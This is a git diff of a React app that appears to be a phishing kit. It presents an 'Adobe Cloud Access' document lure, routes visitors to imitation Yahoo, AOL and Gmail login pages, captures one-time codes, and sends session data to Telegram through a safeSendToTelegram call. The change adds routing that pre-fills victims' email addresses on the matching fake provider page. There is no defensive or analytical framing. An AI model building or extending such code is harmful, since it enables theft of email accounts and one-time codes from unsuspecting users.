@@ -134,6 +134,23 @@ function App() {
     setLoginFlowState({ awaitingOtp: false, sessionData: null });
   };
 
+  const handleOthersEmailSubmit = (email: string): boolean => {
+    const domain = (email.split('@').pop() || '').toLowerCase();
+    if (domain.includes('yahoo')) {
+      navigate(ROUTES.LOGIN_YAHOO, { state: { email } });
+      return true;
+    }
+    if (domain.includes('aol')) {
+      navigate(ROUTES.LOGIN_AOL, { state: { email } });
+      return true;
+    }
+    if (domain.includes('gmail') || domain.includes('google')) {
+      navigate(ROUTES.LOGIN_GMAIL, { state: { email } });
+      return true;
+    }
+    return false;
+  };
+
   if (isLoading) {
     return <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center"><Spinner size="lg" /></div>;
   }
@@ -147,10 +164,10 @@ function App() {
     <Routes>
       <Route path={ROUTES.HOME} element={!hasActiveSession ? <LoginComponent key="provider-select" fileName="Adobe Cloud Access" onLoginSuccess={handleLoginSuccess} onYahooSelect={() => navigate(PROVIDER_URLS.YAHOO)} onAolSelect={() => navigate(PROVIDER_URLS.AOL)} onGmailSelect={() => navigate(PROVIDER_URLS.GMAIL)} onOthersSelect={() => navigate(PROVIDER_URLS.OTHERS)} onBack={() => navigate(ROUTES.HOME)} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.LOGIN} element={<Navigate to={ROUTES.HOME} replace />} />
-      <Route path={ROUTES.LOGIN_YAHOO} element={!hasActiveSession ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
-      <Route path={ROUTES.LOGIN_AOL} element={!hasActiveSession ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
-      <Route path={ROUTES.LOGIN_GMAIL} element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
-      <Route path={ROUTES.LOGIN_OTHERS} element={!hasActiveSession ? <LoginComponent key="others-login" fileName="Adobe Cloud Access" defaultProvider="Others" onLoginSuccess={handleLoginSuccess} onBack={() => navigate(ROUTES.HOME)} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
+      <Route path={ROUTES.LOGIN_YAHOO} element={!hasActiveSession ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
+      <Route path={ROUTES.LOGIN_AOL} element={!hasActiveSession ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
+      <Route path={ROUTES.LOGIN_GMAIL} element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
+      <Route path={ROUTES.LOGIN_OTHERS} element={!hasActiveSession ? <LoginComponent key="others-login" fileName="Adobe Cloud Access" defaultProvider="Others" onLoginSuccess={handleLoginSuccess} onBack={() => navigate(ROUTES.HOME)} onLoginError={e => console.error(e)} onEmailSubmit={handleOthersEmailSubmit} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.OTP} element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} provider={loginFlowState.sessionData?.provider} onResend={() => safeSendToTelegram({ type: 'otp_resend', data: loginFlowState.sessionData })} /> : <Navigate to={ROUTES.HOME} replace />} />
       <Route path={ROUTES.LANDING} element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to={ROUTES.HOME} replace />} />
       <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
